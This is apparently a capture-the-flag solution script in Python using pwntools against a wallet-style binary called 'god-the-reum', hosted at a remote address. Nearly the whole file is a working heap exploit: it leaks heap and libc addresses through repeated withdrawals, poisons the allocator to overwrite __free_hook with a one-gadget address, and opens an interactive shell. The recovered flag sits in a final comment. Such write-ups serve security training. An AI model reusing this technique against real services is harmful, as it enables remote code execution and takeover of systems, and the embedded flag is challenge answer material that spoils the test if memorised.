from pwn import *


DEBUG = 0
if DEBUG:
     p = process('./god-the-reum')
     e = ELF('./god-the-reum')
     #context.log_level = 'debug'
     #libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
     libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
     #p = process(['./steak'], env={'LD_PRELOAD': os.path.join(os.getcwd(),'libc-2.23.so')})
     #libc = ELF('./libc-2.23.so')
     
     
else:
     #e = ELF('./steak')
     p = remote('110.10.147.103', 10001 )
     #p.interactive()
     libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
     #libc = ELF('libc_64.so.6')

wordSz = 4
hwordSz = 2
bits = 32
PIE = 0
mypid=0
def leak(address, size):
   with open('/proc/%s/mem' % mypid) as mem:
      mem.seek(address)
      return mem.read(size)

def findModuleBase(pid, mem):
   name = os.readlink('/proc/%s/exe' % pid)
   with open('/proc/%s/maps' % pid) as maps:
      for line in maps:
         if name in line:
            addr = int(line.split('-')[0], 16)
            mem.seek(addr)
            if mem.read(4) == "\x7fELF":
               bitFormat = u8(leak(addr + 4, 1))
               if bitFormat == 2:
                  global wordSz
                  global hwordSz
                  global bits
                  wordSz = 8
                  hwordSz = 4
                  bits = 64
               return addr
   log.failure("Module's base address not found.")
   sys.exit(1)

def debug(addr):
    global mypid
    mypid = proc.pidof(p)[0]
    #raw_input('debug:')
    
    with open('/proc/%s/mem' % mypid) as mem:
        moduleBase = findModuleBase(mypid, mem)
        print "program_base",hex(moduleBase)
        gdb.attach(p, "set follow-fork-mode child\nb *" + hex(moduleBase+addr))


def create(size):
    p.recvuntil('choice : ')
    p.sendline('1')
    p.recvuntil('eth? : ')
    p.sendline(str(size))


def withdraw(num,size):
    p.recvuntil('choice : ')
    p.sendline('3')
    p.recvuntil('no : ')
    p.sendline(str(num))
    p.recvuntil('withdraw? : ')
    p.sendline(str(size))

def show():
    p.recvuntil('choice : ')
    p.sendline('4')
    

def developer(num,content):
    p.recvuntil('choice : ')
    p.sendline('6')
    p.recvuntil('no : ')
    p.sendline(str(num))
    p.recvuntil('new eth : ')
    p.sendline(content)
def pwn():
    #debug(0xfad)
    create(0x100)
    create(0x60)
    
    withdraw(0,0x100)
    withdraw(0,0)
    show()
    p.recvuntil('ballance ')
    heap_addr=int(p.recvuntil('\n')[:-1])
    print "heap_addr",hex(heap_addr)
    for i in range(0,5):
        withdraw(0,heap_addr)
    #debug(0xfad)
    withdraw(0x0,heap_addr)
    show()
    p.recvuntil('ballance ')
    addr=int(p.recvuntil('\n')[:-1])
    libc_base=addr-0x3ebca0
    rce=libc_base+0x4f322
    free_hook=libc_base+libc.symbols['__free_hook']
    system_addr=libc_base+libc.symbols['system']
    print "libc_base",hex(libc_base)
    withdraw(1,0x60)
    #debug(0xe12)
    developer(1,p64(free_hook))
    create(0x60)
    create(0x60)
    developer(3,p64(rce))
    #create(0x20)
    #debug(0xfad)
    withdraw(2,0x60)
    p.interactive()
    
    
    

if __name__ == '__main__':
   pwn()

#flag{ethereum_is_god_of_the_coin_this_is_called_godthereum}

